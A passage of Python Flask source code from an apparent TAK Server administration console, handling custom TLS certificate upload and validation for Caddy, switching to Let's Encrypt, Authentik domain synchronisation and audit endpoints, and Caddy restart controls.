# === v0.9.51 — Custom certificate (bring-your-own-cert) ===
# Paths for the operator-uploaded full-chain PEM + private key (mode 600).
def _custom_cert_paths():
    ssl_dir = os.path.join(CONFIG_DIR, 'ssl')
    return os.path.join(ssl_dir, 'custom-fullchain.pem'), os.path.join(ssl_dir, 'custom-key.pem')


def _sync_custom_cert_for_caddy():
    """Deploy a Caddy-readable copy of the custom cert/key and return its (cert, key) paths.

    The canonical copies live under .config/ssl (mode 600, root-owned) — but Caddy runs as
    the unprivileged 'caddy' user and cannot even traverse .config (700 root), so pointing
    Caddy's `tls` directive at .config makes it fail to start with 'permission denied'.
    We copy them into Caddy's own data dir (~caddy, owned by the caddy user) on every
    Caddyfile regeneration so the deployed copy always tracks the canonical one.
    Returns (None, None) if the source cert is missing or the copy fails."""
    import shutil, pwd
    src_cert, src_key = _custom_cert_paths()
    if not (os.path.exists(src_cert) and os.path.exists(src_key)):
        return None, None
    try:
        caddy_pw = pwd.getpwnam('caddy')
        base = caddy_pw.pw_dir if os.path.isdir(caddy_pw.pw_dir) else '/var/lib/caddy'
    except KeyError:
        caddy_pw = None
        base = '/var/lib/caddy'
    dst_cert = os.path.join(base, 'infratak-custom-fullchain.pem')
    dst_key = os.path.join(base, 'infratak-custom-key.pem')
    try:
        # v10.0.5 non-root: /var/lib/caddy is caddy:caddy 0750 — the takwerx console can't
        # makedirs/copy/chown/chmod there. Route the copy through the broker (root): read the
        # console-owned source via _read_priv, write the caddy-readable copy via _write_priv,
        # then chown to the caddy user via the broker. Without this, custom (BYO) cert mode
        # silently returns (None,None) and the Caddyfile never gets the `tls` directive.
        _makedirs_priv(base)
        _write_priv(dst_cert, _read_priv(src_cert), perm=0o644)
        _write_priv(dst_key, _read_priv(src_key), perm=0o600)
        if caddy_pw:
            subprocess.run(_sudo_wrap(['chown', f'{caddy_pw.pw_uid}:{caddy_pw.pw_gid}', dst_cert, dst_key]), capture_output=True)
        return dst_cert, dst_key
    except Exception as e:
        print(f"[custom-cert] failed to deploy Caddy-readable cert copy: {e}", flush=True)
        return None, None


def _cert_name_matches(cert_name, target):
    """True if a cert SAN/CN (cert_name, possibly a *.x wildcard) covers hostname target.
    Wildcards match exactly one left-most label (RFC 6125): *.example.com matches
    a.example.com but NOT example.com or a.b.example.com."""
    cert_name = (cert_name or '').strip().lower().rstrip('.')
    target = (target or '').strip().lower().rstrip('.')
    if not cert_name or not target:
        return False
    if cert_name == target:
        return True
    if cert_name.startswith('*.') and '.' in target:
        first, rest = target.split('.', 1)
        return bool(first) and rest == cert_name[2:]
    return False


def _extract_cert_names(cert_file):
    """Return lowercased set of DNS names (Subject CN + subjectAltName DNS:) from a PEM
    cert file, parsing `openssl x509 -text` (universal across OpenSSL versions)."""
    names = set()
    try:
        r = subprocess.run(['openssl', 'x509', '-in', cert_file, '-noout', '-text'],
                           capture_output=True, text=True, timeout=10)
        out = r.stdout or ''
        for cn in re.findall(r'Subject:.*?CN\s*=\s*([^,/\n]+)', out):
            names.add(cn.strip().lower())
        for dns in re.findall(r'DNS:\s*([^,\s]+)', out):
            names.add(dns.strip().lower())
    except Exception:
        pass
    return names


def _validate_custom_cert(cert_pem, key_pem, settings):
    """Validate an uploaded full-chain cert + private key for use as Caddy's TLS cert.

    Hard rejects (return ok=False): unparseable PEM, key/cert mismatch, expired cert,
    SAN/CN not covering the console hostname. Soft warnings (still ok=True): a service
    subdomain not covered, or no intermediate chain present.
    Returns {ok, error, warnings[], not_after, names[]}."""
    import tempfile
    result = {'ok': False, 'error': None, 'warnings': [], 'not_after': None, 'names': []}
    cert_pem = (cert_pem or '').strip()
    key_pem = (key_pem or '').strip()
    if 'BEGIN CERTIFICATE' not in cert_pem:
        result['error'] = 'Certificate file is not PEM (no "BEGIN CERTIFICATE" block found).'
        return result
    if 'PRIVATE KEY' not in key_pem:
        result['error'] = 'Private key file is not PEM (no "BEGIN PRIVATE KEY" block found).'
        return result

    cert_tmp = key_tmp = None
    try:
        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write(cert_pem + '\n'); cert_tmp = f.name
        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write(key_pem + '\n'); key_tmp = f.name
        os.chmod(key_tmp, 0o600)

        if subprocess.run(['openssl', 'x509', '-noout', '-in', cert_tmp],
                          capture_output=True, text=True, timeout=10).returncode != 0:
            result['error'] = 'Certificate could not be parsed by OpenSSL (not a valid PEM certificate).'
            return result
        if subprocess.run(['openssl', 'pkey', '-noout', '-in', key_tmp],
                          capture_output=True, text=True, timeout=10).returncode != 0:
            result['error'] = ('Private key could not be parsed (not valid PEM, or it is '
                               'encrypted — decrypt it first, e.g. `openssl rsa -in enc.key -out plain.key`).')
            return result

        # Key matches cert — compare public keys (works for RSA and EC, unlike modulus-only).
        cert_pub = subprocess.run(['openssl', 'x509', '-in', cert_tmp, '-noout', '-pubkey'],
                                  capture_output=True, text=True, timeout=10).stdout.strip()
        key_pub = subprocess.run(['openssl', 'pkey', '-in', key_tmp, '-pubout'],
                                 capture_output=True, text=True, timeout=10).stdout.strip()
        if not cert_pub or not key_pub or cert_pub != key_pub:
            result['error'] = 'The private key does not match the certificate (public keys differ).'
            return result

        # Not expired / not before now.
        if subprocess.run(['openssl', 'x509', '-checkend', '0', '-noout', '-in', cert_tmp],
                          capture_output=True, text=True, timeout=10).returncode != 0:
            result['error'] = 'The certificate has expired. Upload a current certificate.'
            return result
        ed = subprocess.run(['openssl', 'x509', '-enddate', '-noout', '-in', cert_tmp],
                            capture_output=True, text=True, timeout=10)
        result['not_after'] = ((ed.stdout or '').strip().split('=', 1)[-1].strip() or None)

        # SAN/CN coverage.
        names = _extract_cert_names(cert_tmp)
        result['names'] = sorted(names)
        fqdn = (settings.get('fqdn') or '').strip().split(':')[0]
        sd = _get_all_service_domains(settings)
        infratak_host = sd.get('infratak') or (f'infratak.{fqdn}' if fqdn else '')

        def _covered(target):
            return any(_cert_name_matches(n, target) for n in names)

        if infratak_host and not _covered(infratak_host):
            result['error'] = (f"Certificate does not cover the console hostname '{infratak_host}'. "
                               f"Names in cert: {', '.join(result['names']) or '(none)'}. "
                               f"Use a wildcard (e.g. *.{fqdn}) or add the hostname to the SANs.")
            return result
        for k, host in sd.items():
            if host and host != infratak_host and not _covered(host):
                result['warnings'].append(
                    f"Cert does not cover {host} ({k}) — that subdomain will show a TLS trust warning.")
        if cert_pem.count('BEGIN CERTIFICATE') < 2:
            result['warnings'].append(
                'Only one certificate in the file (no intermediate chain). If your CA issues via '
                'an intermediate, clients may not trust it — upload the full-chain PEM (leaf + intermediates).')

        result['ok'] = True
        return result
    finally:
        for p in (cert_tmp, key_tmp):
            if p:
                try:
                    os.unlink(p)
                except Exception:
                    pass


@app.route('/api/caddy/custom-cert', methods=['POST'])
@login_required
def caddy_custom_cert():
    """Validate, store, and apply an operator-supplied TLS cert (ssl_mode='custom').
    Accepts multipart file uploads (cert_file/key_file) or form/JSON text (cert_pem/key_pem)."""
    settings = load_settings()
    fqdn = (settings.get('fqdn') or '').strip()
    if not fqdn:
        return jsonify({'success': False, 'error': 'Set the base domain and deploy Caddy before uploading a custom certificate.'}), 400

    cert_pem = key_pem = ''
    f = request.files.get('cert_file')
    if f and f.filename:
        cert_pem = f.read().decode('utf-8', 'replace')
    f = request.files.get('key_file')
    if f and f.filename:
        key_pem = f.read().decode('utf-8', 'replace')
    if not cert_pem:
        cert_pem = (request.form.get('cert_pem') or '').strip()
    if not key_pem:
        key_pem = (request.form.get('key_pem') or '').strip()
    if not cert_pem or not key_pem:
        data = request.get_json(silent=True) or {}
        cert_pem = cert_pem or (data.get('cert_pem') or '')
        key_pem = key_pem or (data.get('key_pem') or '')
    if not cert_pem or not key_pem:
        return jsonify({'success': False, 'error': 'Both a certificate (full-chain PEM) and a private key (PEM) are required.'}), 400

    v = _validate_custom_cert(cert_pem, key_pem, settings)
    if not v['ok']:
        return jsonify({'success': False, 'error': v['error']}), 400

    cert_path, key_path = _custom_cert_paths()
    try:
        os.makedirs(os.path.dirname(cert_path), exist_ok=True)
        with open(cert_path, 'w') as fh:
            fh.write(cert_pem.strip() + '\n')
        os.chmod(cert_path, 0o600)
        with open(key_path, 'w') as fh:
            fh.write(key_pem.strip() + '\n')
        os.chmod(key_path, 0o600)
    except Exception as e:
        return jsonify({'success': False, 'error': f'Failed to store certificate files: {e}'}), 500

    settings['ssl_mode'] = 'custom'
    save_settings(settings)
    try:
        generate_caddyfile(settings)
    except Exception as e:
        return jsonify({'success': False, 'error': f'Caddyfile regeneration failed: {e}'}), 500

    # Reload Caddy (graceful — keeps serving old config if the new one is invalid).
    reload_r = subprocess.run(_sudo_wrap(['systemctl', 'reload', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=60)
    reloaded = reload_r.returncode == 0
    if not reloaded:
        # Fall back to a restart (e.g. Caddy was stopped/paused on this box).
        restart_r = subprocess.run(_sudo_wrap(['systemctl', 'restart', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
        reloaded = restart_r.returncode == 0
        if not reloaded:
            return jsonify({'success': False,
                            'error': f'Cert stored, but Caddy reload failed: {(reload_r.stdout or reload_r.stderr or "").strip()[:300]}'}), 500

    # If TAK Server is installed, re-wire its 8446 enrollment keystore to the custom cert
    # in the background (stops/restarts TAK — disruptive, so it runs off the request).
    msg = 'Custom certificate applied. Caddy is now serving your certificate on all subdomains.'
    try:
        if os.path.exists('/opt/tak/CoreConfig.xml'):
            tak_host = _get_service_domain(settings, 'takserver')
            if tak_host:
                def _rewire_8446():
                    install_le_cert_on_8446(tak_host, lambda m: print(f"[custom-cert 8446] {m}", flush=True), wait_for_cert=False)
                threading.Thread(target=_rewire_8446, daemon=True).start()
                msg += ' TAK Server\'s 8446 enrollment cert is updating in the background (TAK will restart).'
    except Exception:
        pass

    return jsonify({'success': True, 'message': msg, 'warnings': v['warnings'], 'not_after': v['not_after']})


@app.route('/api/caddy/ssl-mode', methods=['POST'])
@login_required
def caddy_set_ssl_mode():
    """Switch back to automatic HTTPS (Let's Encrypt) from custom mode. Regenerates the
    Caddyfile without the custom `tls` directives so Caddy resumes ACME, then reloads.
    (Switching INTO custom mode is done via /api/caddy/custom-cert, which needs the cert.)"""
    settings = load_settings()
    data = request.get_json(silent=True) or {}
    mode = (data.get('mode') or '').strip()
    if mode != 'fqdn':
        return jsonify({'success': False, 'error': 'Only switching back to automatic is supported here; use the custom-cert upload to enable custom mode.'}), 400
    if not (settings.get('fqdn') or '').strip():
        return jsonify({'success': False, 'error': 'No base domain configured — deploy Caddy first.'}), 400
    settings['ssl_mode'] = 'fqdn'
    save_settings(settings)
    try:
        generate_caddyfile(settings)
    except Exception as e:
        return jsonify({'success': False, 'error': f'Caddyfile regeneration failed: {e}'}), 500
    reload_r = subprocess.run(_sudo_wrap(['systemctl', 'reload', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=60)
    if reload_r.returncode != 0:
        restart_r = subprocess.run(_sudo_wrap(['systemctl', 'restart', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
        if restart_r.returncode != 0:
            return jsonify({'success': False, 'error': f'Switched setting, but Caddy reload failed: {(reload_r.stdout or reload_r.stderr or "").strip()[:300]}'}), 500
    # v10.0.9: switching to LE makes Caddy reissue the stream cert with a fresh 0600
    # dir/file, dropping MediaMTX's group-read grant → crash-loop (memory
    # mediamtx-cert-grant-renewal-fragile gap 2). Re-assert the grant once the ACME
    # cert has had time to issue — in the background so the response isn't blocked.
    if os.path.exists('/etc/systemd/system/mediamtx.service'):
        def _delayed_mtx_grant():
            for _ in range(20):  # up to ~100s for ACME issuance
                time.sleep(5)
                if _reassert_mediamtx_cert_grant(lambda m: print(f"ssl-mode flip: {m}", flush=True)):
                    return
        threading.Thread(target=_delayed_mtx_grant, daemon=True).start()
    return jsonify({'success': True, 'message': "Switched to automatic HTTPS. Caddy will obtain Let's Encrypt certificates for each subdomain (DNS must resolve to this box and ports 80/443 must be reachable from the internet)."})


@app.route('/api/caddy/custom-cert/info')
@login_required
def caddy_custom_cert_info():
    """Return current custom-cert status for the Caddy page (whether one is stored + expiry)."""
    cert_path, key_path = _custom_cert_paths()
    info = {'present': os.path.exists(cert_path) and os.path.exists(key_path), 'not_after': None, 'names': []}
    if info['present']:
        ed = subprocess.run(['openssl', 'x509', '-enddate', '-noout', '-in', cert_path],
                            capture_output=True, text=True, timeout=10)
        info['not_after'] = ((ed.stdout or '').strip().split('=', 1)[-1].strip() or None)
        info['names'] = sorted(_extract_cert_names(cert_path))
    return jsonify(info)

def _authentik_sync_all_domain_refs(fqdn, settings, plog=None):
    """Comprehensive domain sync for Authentik — covers all 7 locations missed by the v0.9.1 flow.

    1. ~/authentik/.env — AUTHENTIK_HOST and AUTHENTIK_COOKIE_DOMAIN
    2. ~/authentik/docker-compose.yml — LDAP outpost AUTHENTIK_HOST → internal URL
    3. Authentik API — brand: domain, cookie_domain, branding_custom_css, branding_default_flow_background
    4. Authentik API — embedded outpost: config.authentik_host
    5. Authentik API — all proxy providers: external_host, cookie_domain, redirect_uris
    6. docker compose down && up -d (only if env was changed, to pick up env changes)
    """
    import urllib.request as _req
    import urllib.error
    _log = plog or (lambda m: print(f"[domain-sync] {m}", flush=True))

    if not fqdn:
        _log("⚠ No FQDN — skipping Authentik domain sync")
        return

    ak_dir = os.path.expanduser('~/authentik')
    env_path = os.path.join(ak_dir, '.env')
    compose_path = os.path.join(ak_dir, 'docker-compose.yml')
    if not os.path.isdir(ak_dir):
        return

    ak_host = _get_authentik_host(settings) or f'tak.{fqdn}'
    cookie_domain = f'.{fqdn.split(":")[0]}'
    env_changed = False

    # 1. Update .env: AUTHENTIK_HOST and AUTHENTIK_COOKIE_DOMAIN
    if os.path.exists(env_path):
        try:
            with open(env_path) as _f:
                env_lines = _f.readlines()
            new_lines = []
            found_host = found_cookie = False
            for line in env_lines:
                k = line.split('=', 1)[0].strip()
                if k == 'AUTHENTIK_HOST':
                    new_val = f'https://{ak_host}/\n'
                    if line.rstrip('\n') != f'AUTHENTIK_HOST=https://{ak_host}/':
                        env_changed = True
                    new_lines.append(f'AUTHENTIK_HOST=https://{ak_host}/\n')
                    found_host = True
                elif k == 'AUTHENTIK_COOKIE_DOMAIN':
                    if line.rstrip('\n') != f'AUTHENTIK_COOKIE_DOMAIN={cookie_domain}':
                        env_changed = True
                    new_lines.append(f'AUTHENTIK_COOKIE_DOMAIN={cookie_domain}\n')
                    found_cookie = True
                else:
                    new_lines.append(line)
            if not found_host:
                new_lines.append(f'AUTHENTIK_HOST=https://{ak_host}/\n')
                env_changed = True
            if not found_cookie:
                new_lines.append(f'AUTHENTIK_COOKIE_DOMAIN={cookie_domain}\n')
                env_changed = True
            with open(env_path, 'w') as _f:
                _f.writelines(new_lines)
            _log(f"✓ .env: AUTHENTIK_HOST=https://{ak_host}/ AUTHENTIK_COOKIE_DOMAIN={cookie_domain}")
        except Exception as e:
            _log(f"⚠ .env update: {e}")

    # 2. Fix LDAP outpost AUTHENTIK_HOST in docker-compose.yml → internal URL (survives all domain changes)
    _ldap_internal = 'http://authentik-server-1:9000/'
    if os.path.exists(compose_path):
        try:
            with open(compose_path) as _f:
                comp = _f.read()
            comp_orig = comp
            import re as _re_ds
            # Replace any AUTHENTIK_HOST value in the ldap service block with the internal URL
            comp = _re_ds.sub(
                r'(AUTHENTIK_HOST:\s*)https?://[^\s\n]+',
                r'\g<1>' + _ldap_internal,
                comp
            )
            if comp != comp_orig:
                with open(compose_path, 'w') as _f:
                    _f.write(comp)
                _log(f"✓ docker-compose.yml: LDAP AUTHENTIK_HOST → {_ldap_internal} (internal)")
                subprocess.run(
                    _sudo_wrap(['docker', 'compose', 'up', '-d', '--force-recreate', 'ldap']), cwd=ak_dir, capture_output=True, text=True, timeout=60
                )
                _log("✓ LDAP container recreated with internal host")
            else:
                _log(f"✓ docker-compose.yml: LDAP AUTHENTIK_HOST already internal — no change")
        except Exception as e:
            _log(f"⚠ compose LDAP host: {e}")

    # Get API token
    ak_token = (_get_authentik_env_value(settings, 'AUTHENTIK_BOOTSTRAP_TOKEN') or
                _get_authentik_env_value(settings, 'AUTHENTIK_TOKEN') or '')
    if not ak_token:
        _log("⚠ No Authentik token — skipping API updates")
    else:
        ak_url = _get_authentik_api_url(settings)
        ak_headers = {'Authorization': f'Bearer {ak_token}', 'Content-Type': 'application/json'}
        _ak_pub_url = f'https://{ak_host}'

        # 3. PATCH default brand
        try:
            r = _req.Request(f'{ak_url}/api/v3/core/brands/', headers=ak_headers)
            brands = json.loads(_req.urlopen(r, timeout=10).read().decode()).get('results', [])
            if brands:
                brand = brands[0]
                brand_id = brand.get('brand_uuid') or brand.get('pk')
                patch = {'domain': ak_host, 'cookie_domain': cookie_domain}
                # Scan branding_custom_css for old domain string and replace
                css = brand.get('branding_custom_css') or ''
                old_fqdn_guess = None
                for candidate in [brand.get('domain', ''), css]:
                    # heuristic: if css contains an old domain, replace it
                    pass
                if css and fqdn not in css:
                    # May contain old domain — try to replace any https://.../ pattern
                    import re as _re_css
                    new_css = _re_css.sub(r'https://[^/"\'\s]+\.', f'https://{ak_host.split(".")[0]}.', css)
                    if new_css != css:
                        patch['branding_custom_css'] = new_css
                # Reset default flow background if it references an old domain
                bg = brand.get('branding_default_flow_background') or ''
                if bg and fqdn not in bg and ('http' in bg):
                    patch['branding_default_flow_background'] = '/static/dist/assets/images/flow_background.jpg'
                _req.urlopen(_req.Request(f'{ak_url}/api/v3/core/brands/{brand_id}/',
                    data=json.dumps(patch).encode(), headers=ak_headers, method='PATCH'), timeout=10)
                _log(f"✓ Brand: domain={ak_host}, cookie_domain={cookie_domain}")
        except Exception as e:
            _log(f"⚠ Brand update: {str(e)[:120]}")

        # 4. PATCH embedded outpost config.authentik_host → PUBLIC base URL.
        # v10.0.3: this is the BROWSER-FACING proxy outpost — its authentik_host is the
        # host the forward-auth redirect sends users to for login. It must be the public
        # base URL (https://tak.<fqdn>), NOT the internal _ldap_internal — the old internal
        # value made the authorize redirect point at authentik-server-1:9000 (unreachable
        # from a browser) → the 2026-06-23 SSO break. This now matches the authoritative
        # _ensure_embedded_outpost_authentik_host() startup migration (was contradicting it).
        try:
            r = _req.Request(f'{ak_url}/api/v3/outposts/instances/?search=embedded', headers=ak_headers)
            outposts = json.loads(_req.urlopen(r, timeout=10).read().decode()).get('results', [])
            embedded = next((o for o in outposts if 'embed' in (o.get('name') or '').lower() or o.get('type') == 'proxy'), None)
            if embedded:
                op_pk = embedded.get('pk')
                full = json.loads(_req.urlopen(_req.Request(f'{ak_url}/api/v3/outposts/instances/{op_pk}/', headers=ak_headers), timeout=10).read().decode())
                cfg = full.get('config') or {}
                _emb_host = _get_authentik_base_url(settings) or f'https://{ak_host}'
                cfg['authentik_host'] = _emb_host
                cfg['authentik_host_insecure'] = False
                _req.urlopen(_req.Request(f'{ak_url}/api/v3/outposts/instances/{op_pk}/',
                    data=json.dumps({'config': cfg}).encode(), headers=ak_headers, method='PATCH'), timeout=10)
                _log(f"✓ Embedded outpost: config.authentik_host → {_emb_host}")
        except Exception as e:
            _log(f"⚠ Embedded outpost: {str(e)[:120]}")

        # 5. PATCH all proxy providers: external_host, cookie_domain, redirect_uris
        try:
            r = _req.Request(f'{ak_url}/api/v3/providers/proxy/?page_size=100', headers=ak_headers)
            providers = json.loads(_req.urlopen(r, timeout=15).read().decode()).get('results', [])
            for prov in providers:
                pk = prov.get('pk')
                if not pk:
                    continue
                try:
                    # Fetch full provider to get all required fields for PATCH
                    full_prov = json.loads(_req.urlopen(
                        _req.Request(f'{ak_url}/api/v3/providers/proxy/{pk}/', headers=ak_headers), timeout=10
                    ).read().decode())
                    # Build updated external_host: keep the service subdomain LABEL and
                    # swap the base domain to the new fqdn. v10.0.3: the old
                    # rsplit(".",2)[-2] grabbed the base domain's FIRST label, producing
                    # <baselabel>.<fqdn> (e.g. nebraskatak.nebraskatak.net) — the
                    # 2026-06-23 SSO "Not found". First label is correct for every proxy
                    # provider (all single-label subdomains: infratak/takportal/stream/…)
                    # and also discards any stray middle label from a polluted old host.
                    ext_host = full_prov.get('external_host') or ''
                    _ehm = re.match(r'https?://([^/]+)', ext_host) if ext_host else None
                    if _ehm:
                        ext_host = f'https://{_ehm.group(1).split(".")[0]}.{fqdn}'
                    # Update redirect_uris — replace old domain in all URL entries
                    uris = full_prov.get('redirect_uris') or []
                    new_uris = []
                    for uri in uris:
                        url = uri.get('url') or ''
                        if url and 'http' in url:
                            import re as _re_uri
                            # Replace the domain portion while keeping the path
                            parts = url.split('://', 1)
                            if len(parts) == 2:
                                rest = parts[1]
                                old_host_part = rest.split('/')[0]
                                # Derive new host: keep subdomain prefix, replace base domain
                                subdomain = old_host_part.split('.')[0] if '.' in old_host_part else old_host_part
                                new_host = f'{subdomain}.{fqdn}'
                                url = 'https://' + new_host + ('/' + '/'.join(rest.split('/')[1:]) if '/' in rest else '')
                        new_uris.append({'url': url, 'matching_mode': uri.get('matching_mode', 'strict')})
                    patch = {
                        'external_host': ext_host,
                        'cookie_domain': cookie_domain,
                        'redirect_uris': new_uris,
                        # Required fields to pass cross-field validators
                        'name': full_prov.get('name', ''),
                        'authorization_flow': full_prov.get('authorization_flow'),
                        'mode': full_prov.get('mode', 'proxy'),
                        'internal_host': full_prov.get('internal_host') or '',
                        'internal_host_ssl_validation': full_prov.get('internal_host_ssl_validation', False),
                    }
                    _req.urlopen(_req.Request(f'{ak_url}/api/v3/providers/proxy/{pk}/',
                        data=json.dumps(patch).encode(), headers=ak_headers, method='PATCH'), timeout=10)
                except Exception as ep:
                    _log(f"  ⚠ Provider {pk}: {str(ep)[:80]}")
            _log(f"✓ Proxy providers updated ({len(providers)} total)")
        except Exception as e:
            _log(f"⚠ Proxy providers: {str(e)[:120]}")

    # 6. Restart Authentik if env changed (env changes require full down/up, not just restart)
    if env_changed:
        _log("Env changed — running docker compose down && up -d to apply (this takes ~30s)…")
        try:
            _run_priv_chain([['docker', 'compose', 'down', '--timeout', '20'], ['docker', 'compose', 'up', '-d']], 'and', timeout=120, cwd=ak_dir)
            _log("✓ Authentik restarted with new env")
        except Exception as e:
            _log(f"⚠ Authentik restart: {e}")
    else:
        _log("Env unchanged — no container restart needed")


@app.route('/api/authentik/domain-audit')
@login_required
def authentik_domain_audit_api():
    """Sweep for stale domain references across Authentik config files and database.

    Checks: ~/authentik/.env, ~/authentik/docker-compose.yml, and all Authentik API
    objects (brand, outposts, proxy providers) for any value that does not match the
    current FQDN. Returns a list of {location, field, current_value} stale entries.
    """
    import urllib.request as _req
    settings = load_settings()
    fqdn = (settings.get('fqdn') or '').strip()
    if not fqdn:
        return jsonify({'ok': False, 'error': 'No FQDN configured'}), 400

    ak_host = _get_authentik_host(settings) or f'tak.{fqdn}'
    ak_dir = os.path.expanduser('~/authentik')
    stale = []

    # Check .env
    env_path = os.path.join(ak_dir, '.env')
    if os.path.exists(env_path):
        try:
            with open(env_path) as _f:
                for line in _f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    k, _, v = line.partition('=')
                    k = k.strip(); v = v.strip()
                    if k == 'AUTHENTIK_HOST' and fqdn not in v:
                        stale.append({'location': '~/authentik/.env', 'field': 'AUTHENTIK_HOST', 'current_value': v})
                    if k == 'AUTHENTIK_COOKIE_DOMAIN' and fqdn not in v:
                        stale.append({'location': '~/authentik/.env', 'field': 'AUTHENTIK_COOKIE_DOMAIN', 'current_value': v})
        except Exception as e:
            stale.append({'location': '~/authentik/.env', 'field': '(read error)', 'current_value': str(e)[:80]})

    # Check docker-compose.yml LDAP AUTHENTIK_HOST
    compose_path = os.path.join(ak_dir, 'docker-compose.yml')
    if os.path.exists(compose_path):
        try:
            with open(compose_path) as _f:
                comp = _f.read()
            import re as _re_audit
            for m in _re_audit.finditer(r'AUTHENTIK_HOST:\s*(\S+)', comp):
                val = m.group(1).strip()
                if val and val != 'http://authentik-server-1:9000/' and fqdn not in val:
                    stale.append({'location': '~/authentik/docker-compose.yml', 'field': 'AUTHENTIK_HOST (LDAP)', 'current_value': val})
        except Exception as e:
            stale.append({'location': '~/authentik/docker-compose.yml', 'field': '(read error)', 'current_value': str(e)[:80]})

    # Check Authentik API
    ak_token = (_get_authentik_env_value(settings, 'AUTHENTIK_BOOTSTRAP_TOKEN') or
                _get_authentik_env_value(settings, 'AUTHENTIK_TOKEN') or '')
    if ak_token:
        ak_url = _get_authentik_api_url(settings)
        ak_headers = {'Authorization': f'Bearer {ak_token}', 'Content-Type': 'application/json'}
        try:
            brands = json.loads(_req.urlopen(_req.Request(f'{ak_url}/api/v3/core/brands/', headers=ak_headers), timeout=10).read().decode()).get('results', [])
            for b in brands:
                if fqdn not in (b.get('domain') or ''):
                    stale.append({'location': 'Authentik brand', 'field': 'domain', 'current_value': b.get('domain') or ''})
                cd = (b.get('cookie_domain') or '').strip()
                if cd and fqdn not in cd:
                    stale.append({'location': 'Authentik brand', 'field': 'cookie_domain', 'current_value': cd})
                css = b.get('branding_custom_css') or ''
                if css and fqdn not in css and 'http' in css:
                    stale.append({'location': 'Authentik brand', 'field': 'branding_custom_css', 'current_value': css[:120]})
                bg = b.get('branding_default_flow_background') or ''
                if bg and fqdn not in bg and 'http' in bg:
                    stale.append({'location': 'Authentik brand', 'field': 'branding_default_flow_background', 'current_value': bg[:120]})
        except Exception as e:
            stale.append({'location': 'Authentik brand API', 'field': '(error)', 'current_value': str(e)[:80]})
        try:
            outposts = json.loads(_req.urlopen(_req.Request(f'{ak_url}/api/v3/outposts/instances/?search=embedded', headers=ak_headers), timeout=10).read().decode()).get('results', [])
            for o in outposts:
                cfg = o.get('config') or {}
                h = cfg.get('authentik_host') or ''
                if h and 'authentik-server-1' not in h and fqdn not in h:
                    stale.append({'location': f'Outpost: {o.get("name")}', 'field': 'config.authentik_host', 'current_value': h})
        except Exception as e:
            stale.append({'location': 'Authentik outpost API', 'field': '(error)', 'current_value': str(e)[:80]})
        try:
            providers = json.loads(_req.urlopen(_req.Request(f'{ak_url}/api/v3/providers/proxy/?page_size=100', headers=ak_headers), timeout=15).read().decode()).get('results', [])
            for p in providers:
                eh = p.get('external_host') or ''
                if eh and fqdn not in eh:
                    stale.append({'location': f'Proxy provider: {p.get("name")}', 'field': 'external_host', 'current_value': eh})
                cd = p.get('cookie_domain') or ''
                if cd and fqdn not in cd:
                    stale.append({'location': f'Proxy provider: {p.get("name")}', 'field': 'cookie_domain', 'current_value': cd})
                for uri in (p.get('redirect_uris') or []):
                    url = uri.get('url') or ''
                    if url and 'http' in url and fqdn not in url:
                        stale.append({'location': f'Proxy provider: {p.get("name")}', 'field': 'redirect_uri', 'current_value': url})
        except Exception as e:
            stale.append({'location': 'Authentik proxy providers API', 'field': '(error)', 'current_value': str(e)[:80]})

    return jsonify({'ok': True, 'fqdn': fqdn, 'stale': stale, 'clean': len(stale) == 0})


@app.route('/api/caddy/domain', methods=['POST'])
@login_required
def caddy_update_domain():
    """Update domain and regenerate Caddyfile"""
    data = request.get_json()
    domain = data.get('domain', '').strip().lower()
    if not domain:
        return jsonify({'success': False, 'error': 'Domain is required'})
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$', domain):
        return jsonify({'success': False, 'error': 'Invalid domain/FQDN format'})
    settings = load_settings()
    old_fqdn = settings.get('fqdn', '')
    settings['fqdn'] = domain
    save_settings(settings)
    generate_caddyfile(settings)
    modules = detect_modules()
    if modules.get('authentik', {}).get('installed'):
        def _sync_ak_after_domain():
            time.sleep(3)
            try:
                s = load_settings()
                _authentik_sync_all_domain_refs(domain, s)
                ak_token = _get_authentik_env_value(s, 'AUTHENTIK_TOKEN') or _get_authentik_env_value(s, 'AUTHENTIK_BOOTSTRAP_TOKEN')
                if ak_token:
                    _ensure_authentik_console_app(domain, ak_token)
                    ak_url = _get_authentik_api_url(s)
                    ak_headers = {'Authorization': f'Bearer {ak_token}', 'Content-Type': 'application/json'}
                    _repair_embedded_outpost_all_apps(ak_url, ak_headers, s)
                if _is_module_deployed(s, 'takportal'):
                    _sync_authentik_takportal_provider_url(s)
            except Exception as _e:
                print(f"[domain-sync] post-domain-change sync error: {_e}", flush=True)
        threading.Thread(target=_sync_ak_after_domain, daemon=True).start()
    # Restart Caddy in background
    def _restart():
        time.sleep(2)
        try:
            subprocess.run(_sudo_wrap(['systemctl', 'restart', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
        except Exception:
            pass
    threading.Thread(target=_restart, daemon=True).start()
    return jsonify({'success': True, 'domain': domain, 'output': 'Caddy restart scheduled. Authentik domain sync running in background.'})

@app.route('/api/caddy/caddyfile')
@login_required
def caddy_get_caddyfile():
    if os.path.exists(CADDYFILE_PATH):
        with open(CADDYFILE_PATH) as f:
            return jsonify({'success': True, 'content': f.read()})
    return jsonify({'success': False, 'content': ''})

def _caddy_restart_after_response():
    """Run in background: write Caddyfile and restart Caddy after a short delay so the HTTP response can be sent first (console is often behind Caddy)."""
    time.sleep(2)
    try:
        generate_caddyfile(load_settings())
        subprocess.run(_sudo_wrap(['systemctl', 'restart', 'caddy']), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=90)
    except Exception:
        pass

@app.route('/api/caddy/control', methods=['POST'])
@login_required
def caddy_control():
    data = request.get_json()
    action = data.get('action', '')
    if action == 'restart':
        generate_caddyfile(load_settings())
        threading.Thread(target=_caddy_restart_after_response, daemon=True).start()
        return jsonify({'success': True, 'output': 'Caddy restart scheduled; connection may drop briefly.'})
    elif action == 'stop':
